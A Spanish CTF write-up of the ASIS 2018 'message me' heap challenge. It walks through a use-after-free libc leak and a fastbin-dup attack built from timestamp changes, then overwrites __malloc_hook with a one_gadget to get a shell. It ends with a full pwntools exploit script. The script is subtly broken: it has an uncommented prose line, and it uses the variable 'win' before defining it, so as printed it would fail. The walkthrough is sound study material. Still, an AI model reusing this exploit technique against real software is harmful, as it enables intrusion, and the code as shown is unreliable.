@@ -1,0 +1,321 @@
+<!-- wp:paragraph -->
+<p>¡Hola! Ayer estuve haciendo un desafío con el ánimo de practicar y resultó bastante entretenido, así que hice un writeup, ¡espero que les guste! El desafío es un challenge de ASIS 2018 titulado message me. Pueden encontrar el binario y la versión de libc provista en el siguiente<a href="https://github.com/dplastico/messagemeporta"> </a><a href="https://github.com/dplastico/messageme">link </a>(además de la solución que detallaremos ahora) Recuerden que deben parchar la version de libc con el respectivo loader, yo en lo personal uso <a href="https://github.com/NixOS/patchelf">patchelf</a><br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Bueno analizamos el binario y vemos que es un ELF de 64 bit sin PIE (aunque no importara mucho ya verán) canary y Partial RELRO</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/28Us5ztVebP2dt5uLTf0E_hYqfGwvxBgVCA_5tTsdl5-J-hCs1UuPho4im72G8B7N6g-11wwn4TyJZ9OnUScBoQzENShRI6nTMw09XtGJNx1qR-Fhs6JKujNFqsHU0ib29zIn1Jn" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Observamos el binario el cual solo observando el menú podemos ver que es un desafío de heap, el cual nos permite agregar (malloc) remover(free) mostrar el mensaje y cambiar el timestamp (ya abordaremos esto).</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/8RJIxvlIRNAHDJkDpeh8GP2kqU9zeveFMKzilXI5p9JN4eE2397bOZgcpIR8xFlEzzfzO1g2Eh1WLbaOHQQUtvTIsmRbctTqOUzSoZHAh8kVCHa0pkeqkAYET3cje6igeD9tOH8-" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>&nbsp;Obviamente nos encontramos frente a un binario con explotación de heap. No voy a detallar todos los pasos del heap explotation, pero si pueden leer acerca de malloc y free aca:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://sourceware.org/glibc/wiki/MallocInternals">Malloc internals</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Y sobre explotación de heap les recomiendo este sitio:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://github.com/shellphish/how2heap">How2Heap</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ahora veamos reversar el challenge, podemos ver que fuera del timestamp (aun no!!! ) todo es “normal” tenemos un menu, llamamos a malloc, free, pero vemos que las variables no se inicializan bien lo cual nos permite un UAF (use after free) e incluso un DF (double free) pero que veremos será difícil de atacar<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/gluuYp971pjmhkmzHijPO_jWs_0eMZb9iW137zHImuT1djUpQX3wAIbSBd_zg0XWfz4zN1c4QzwQjG8gBe68GtJJNJtbzuOfrgwgJoQ37FOEgEAd7cCVrxvVct82x7F_lpGqo7S_" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/m2Bc4c8mBigIXBfzVUlGFCNwLUV2rFu1V2qHy_jQXpZZzo35uYUA1WjvAg3wf1AAc-Us9yIDNJfFiaxXWvPEsg3rvDZNsahGW0iOCRBoPOqmiT8kRQXkPdxXEo-pT5bxQA3bXwoC" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Pues bien con esto en mente intentemos explotar el binario, para eos primero creamos algunas funciones que nos ayudarán en nuestro exploit, algo un poco molesto era el buffering, que no me di el tiempo de reversar para analizar por qué ocurría, pero eso me obligó a poner llamadas a sleep entre cada input para poder enviar bien el payload (ta lo verán en el código) De todas formas nótese que cuando tratamos de hacer double free tenemos que superar la mitigación de fast top (por tanto tenemos que darle free a un chunk, entre medio)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/E6Haw2m-mWfzgVybwmHbTz-12PYq75Lu8PeOH4kW2kWFx8oJPsknBvEDhYYkljKPORwzQCYOd10pxzHiHkzeoEm7HOQl2MJ1zB12G3wjMQZATN0VjrFL2Kqt8UCrAlVBt35AnycG" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/X4WH9gNBVV9aCVAnFcq3iVc_oOsf_PJMeFToAAVLDmymk4Pv2cWelMN0Z1FXnV7E5AFio3oUeTJj2uf0UtljUfZDvOdnNeDjnUVrZqZiFb_INWDvKr10pA0CklZ-xffcELoZH8C0" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p><br />Ahora cuando comenzamos a asignar “chunks” o bloques como son llamados (me referiré a chunks, porque spanglish, uwu) a estos se le agrega un timestamp, lo cual nos traerá problemas, ya que aprovechandonos de UAF o el DF podríamos “tampear” el fd con nuestra data, pero vemos que esto no se podrá, alocamos algunos chunk y revisamos con vis (comando de pwndbg para mostrar el heap) Además agrega 0x10 al size de nuestro payload (chunk)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/NNZpq3AuJmssQqsGSfcMUHrNdYF7wf9hHa9xyuPuE4ZGjB3czLd74vQsM7YMocozZQ-p2Bo8za-NguCS55UyUIx9jtdGk8UD334Tl1oXUD7xuXPvrr_s6HcroMuLJES4gVKBhG7k" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Esto nos dificulta la explotación, por lo que trataremos de generar un leak, y para eso utilizaremos un chunk fuera del rango de fastbins (por defecto arriba de 0x80) para enviarlo al unsorted bin, esto nos permitirá lekear con el UAF una dirección de libc</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/VaI70rp5ZG2BkXXKoib9W_u02pgErlbSeTXmP5LzndTVLnm4VpK1457uS4isLc0f5PWLtjNYbSn60Vzx4XiUnOjsPA4zJppE9qLAzcrckOKbgHBj_q3_vyBoLyOUbnS7R5mns_kK" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Así ya con esto podemos codear y generar el leak<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/UDMLsQavVsCQLA_5SU58LRQu1u3hM47TJZagbphPLH1opt3_OXZoflu_B1FIGh9H6umAS-WsWQMO2wo_-EL3lvNbBlepr_jC_Rf1uL-PjwVNw3XRUFEoMoibkEBaN636T8upbOER" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Pues bien ahora que tenemos un leak de libc podemos calcular direcciones y “tampear” un posible “FD” para llamar un bloque falso (fake chunk) y así sobreescribir alguna dirección importante, como no tenemos leak de HEAP&nbsp; o del binario en sí, apuntaremos a libc, y para eso intentaremos sobreescribir “malloc_hook”, ya que al sobrescribir este “hook” cada vez que se llame a malloc() se ejecutara nuestro payload (que sobreescribimos en el malloc hook)&nbsp; puedes encontrar información sobre los hook  <a href="https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html">aca&nbsp;</a> y <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc/">aca</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ahora nuestro problema es el timestamp.. Que podemos hacer? No podemos hacer un DF ya que nuestros FD no podemos “tampearlos”, si intentamos escribir el chunk free nos devolverá un timestamp, pues bueno despues de mucho me di cuenta que si usaba la opción “change timestamp” esta cambiaba el valor e iba aumentando, eventualmente me di cuenta que si lo cmabiaba 3 veces este aumentaba 0x10 siempre. Por lo que usare ese cambio para modificar un FD válido y generar un Double free modificando el valor del FD a apuntar a un chunk nuevo debajo de él mismo en el heap… Suena enredado pero ahora se entenderá<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Primero creamos 3 chunks en el rango de fastbin (solo dos usaremos, pero el primero es para hacer de top, y ademas por que inicialmente intente sobreescribir el free hook, y ese chunk seria mi argv, pero esto no lo pude hacer hehehe) se puede ver que como es esperado una vez liberado el chunk apunta al chunk liberado anteriormente (single list)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/abtdMeyvK-b-k1E4Fp_Bx_IU5GkCdA37n9OvRZKn2qb0HXXIeNNovvJFLO4CsalXDyhWsHKl1wK6rrv1CQBykvf0hpZcvv3leCeY9EDXfi6hVHaH8118n8gDOwfsZzAfIZz0MHEU" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Pues si modificamos el timestamp vemos que el valor cambia<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/Xh_S0NWlP2SsNLipJ6nrFSVNgGK3mxprtw3-wCLxHYxY5jyqLBh2j9wm4I8j4HFruJRlYLIKZNIXP80mKpd-3VO16caKjdLTaE_LHV8JJd9A66ol7xaoBq65t-zCGCZ8N1YJH7k9" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Si lo repetimos dos veces más llega a apuntar justo abajo de nuestro chunk donde he creado un “fake chunk” del mismo tamaño:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/G1enjEBTpgfOyP73f853uVbMXnAeT2JA810uQliKgZL68YIVf7NZuSiq8UYmiwR7AnzH1X5aV9whq3GA9U8vhwi24sSMUaaUBxFpl0D47lOKR0S472GLBWSU1UQYkjk38jEcgWK4" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Con esto tenemos una primitiva de fastbins dup, sin DF, pero simulado creamos un puntero a un fake nuestro, intentaremos entonces sobrescribir dicho valor con malloc hook -16, para detenernos justo sobre el hook y escribir,&nbsp; y así redirigir hacia allá el flujo del programa</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/PUcufC69RWTiPVIbaCrz8zfG5qmdLkuLUkVyV6VaXV8DDozXfqdVXnA5JY4K-CINEulACzJ6NyUNFIvsnicFFBJavn7-gVxD3RiZskOA-g9SO3OOLaxexOGHtpAeuEEU2Mu4yKc0" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Con esto ya podemos redirigir a malloc como nuestra el comando fastbins</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/XRCLbK9jdWMhaMnwi_AGUZCU6_v9FO3t80VpsbgMpJd6oMKvVmdkK04gKNCg5OH8cVMzrHKUKNE3sE0nYVFLKc4y7Deky5Say1UCdci4NLnZn2llLZcDgGOU4LbakMXabxWGiH0U" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Esto nos provoca un error ya que existe una mitigación en libc dado que el chunk que estoy llamando no tiene el “size” apropiado (podemos usar frame, para ver el error)<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/Y_14jiY8E1OTNGmZgRVk5d4Iv7HLx5f2ULIhCCqfoGKSVSSkha3GNCHLap9NXJkqvsM3cp3aPfrSsItDg7D-wiiFOG6NkbMngW__Let5mnBRArXxRcMJxqbbB6v1L45nsOyUdjbc" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>&nbsp;si revisamos en malloc_hook -16 tenemos un null quadword… Por tanto debemos buscar un size apropiado cerca de malloc_hook. Una cosa importante de mencionar, es que malloc no revisa el alineamiento de las direcciones en la llamada por tanto si “desreferenciamos” alguna dirección con un tamaño apropiado, podremos usarla, obviamente también hay magias de pwndbg que nos permiten encontrar un 7f size, cerca de malloc hook<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/aGd9nX1xh6qd_LeKJl1vg4hkpDXjQ5KDeeLmhV-BTlO4XcXh40H5JqcZjf3RH4nDIEqPCHDIWEPuiyW1T_5yyF1F2aMtQ0d-xbRmZ_GTKX2Y7R70D1x1-IFYJ3ENuoofyvfNwyeH" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/NnYnw0OiCNnWD0jHtvanklXaimMXpyP0D9T1fSavjB-kRgEkXqsDUnUmmTurquYeyKqEB8YGEeAne_GyYam8HB53PjHt6VjbIEiiU5ypGMJHvZlnn8HB7mo4BjDwV53yU6LbFbbv" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Modificamos nuestro payload para calzar con el offset a nuestro fake size<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/msVyo0ZGpPAfWpviAJjVEJaRoOyAyUab5rbPVk4bymkI05VQ8WTDKJclzHThLWNIuiZGUYTsbOWo7jMM6PJ3njK_V8Fryc0gG8y57x0qXoDlDZ43WLvyZzs2y8B6O7A1nC4pCdcj" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Y modificamos nuestra llamada que sobreescribirá malloc con algún valor<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/acdPWNNsUT3DZEN0Eu4KUXqrV9Omh8xaX5ZDi9AgKZSHObmEvi7XSqYFUr6KSsnRW61un6wOJRwvFN8wekb1pHLO94P4h-146O1u-wRMco0TeoV9d2XLU00jKrdtz4RzuR6uzhNb" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ejecutamos y vemos que podemos sobreescribir el hook sin problemas y redirigir el flujo del programa<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/qGgFlW0n39k2kzinN5hpE8f-Q86VA1cEY5g0tKRcwKeb2CET0JuyfPWCOJKg8Is98meaTIWKPqzVEO_l0mLXz9yAGFXP-lU2mkI6Sc2ES5mgQY5zCev9FlX9OnBwh-txiOYX8A-p" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Con esto solo nos queda solo ver como obtener una shell, esta vez fue sencillo, usamos un one_gadget dentro de libc que buscamos con la herramienta del mismo nombre<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/mSN82czasednuGUxg0_1Qox1SNrNy9jPcWxw6IbLjGk02NZ5FO0JFqkaJRxZjVLUowU2SyP_8UQgCvbTxfJOzHz5ZWDDvfApyPtzTZUJPDcWr0oPyziOASBzEiPpJ_21DriEumQB" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/BGbhiwpOi-OBU9fOS7FuNKfwGDm5DiW_Tmq-EVvv4lNcmqLaLtrn2TJaO-dQoT61nlsyY5MC0F0G7tXieXpas8Woij2dT_jIKwOiwJpMxrNtLWclepGCkoGYmWkqxJxru7Ltb4Es" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Y obtenemos una shell luego de llamar a malloc nuevamente, acá el exploit final:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>#!/usr/bin/python3
+from pwn import *
+#binary setup
+elf = context.binary = ELF('./message')
+context.terminal = ['tmux', 'splitw', '-hp', '70']
+gs = '''
+continue
+'''
+libc = elf.libc
+index = 0
+def start():
+    if args.GDB:
+        return gdb.debug('./message', gdbscript=gs)
+    if args.REMOTE:
+        return remote('127.0.0.1', 5555)
+    else:
+        return process('./message')
+#add a message
+def malloc(size, data):
+    global index
+    r.sendline("0")
+    r.sendline(f"{size}")
+    r.sendline(data)
+    index += 1
+    return index - 1
+    print("index, ",index-1)
+#remove the message
+def free(index):
+    r.sendline("1")
+    r.sendline(f"{index}")
+    #r.recvuntil("choice :")
+#show the message
+def show(index):
+    r.sendline("2")
+    sleep(0.2)
+    r.sendline(f"{index}")
+    resp = r.recv(0x58)
+    #r.recvuntil("choice :")
+    return resp
+#3 change the timestamp
+def change(index):
+    r.sendline("3")
+    r.sendline(f"{index}")
+
+r = start()
+#========= exploit here ===================
+#sleeps for the buffering of the binary
+#===== LEAK ==========
+leak = malloc(0x200, "A" *8)
+sleep(0.3)
+guard = malloc(0x18, "YYYYYYYY")
+r.timeout = 0.1
+show(leak) #ctipe first
+sleep(0.3)
+free(leak) #free chunk
+sleep(0.3)
+show(leak) #show leak
+#it seems im buffering the output so some timeouts
+#maybe there's a better way to do it
+r.recvuntil("Message : ")
+r.timeout = 0.1
+sleep(0.3)
+r.recvuntil("Message : ")
+r.timeout = 0.1
+l = u64(r.recvline().strip().ljust(8,b'\x00'))
+libc.address = l - 0x399b78
+#no mitigations for fake chunk sizes
+log.info(f"libc leak {hex(l)}")
+log.info(f"libc base {hex(libc.address)}")
+log.info(f"malloc hook {hex(libc.sym.__malloc_hook)}")
+log.info(f"free hook {hex(libc.sym.__free_hook)}")
+
+#============ redirecting flow of execution =====
+
+#double free (cuidado con el topfast)
+#since we have a stamp date lets try to create fake chunks
+#allocating 2 chunks and a top one to anchor
+top_fast = malloc(96, "X"*8)
+sleep(0.3)
+A = malloc(96, p64(0x71) + p64(libc.sym.__malloc_hook-16))#fake chunk near malloc hook
+sleep(0.3)
+B = malloc(96, "B"*8)
+sleep(0.3)
+r.timeout = 0.1
+#free (not double free lest stack them manually)
+free(top_fast)
+sleep(0.3)
+free(A)
+sleep(0.3)
+free(B)
+sleep(0.3)
+#change the stamp 3 times will add 0x10
+change(B)
+sleep(0.3)
+change(B)
+sleep(0.3)
+change(B)
+sleep(0.3)
+setting up the fastbindup attack
+C = malloc(96, "C"* 32)
+sleep(0.3)
+D = malloc(96, "D"* 32)
+sleep(0.3)
+win - 0xdeadbeef
+malloc(96, b"A" *11 + win)
+
+win = p64(libc.address + 0xd6701)
+#win - 0xdeadbeef
+malloc(96, b"A" *11 + win) #add the one_gadget here
+sleep(0.3)
+malloc(24, "Y") #trigger malloc_hook
+
+#========= interactive ====================
+r.interactive()
+</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p><br /></p>
+<!-- /wp:paragraph -->
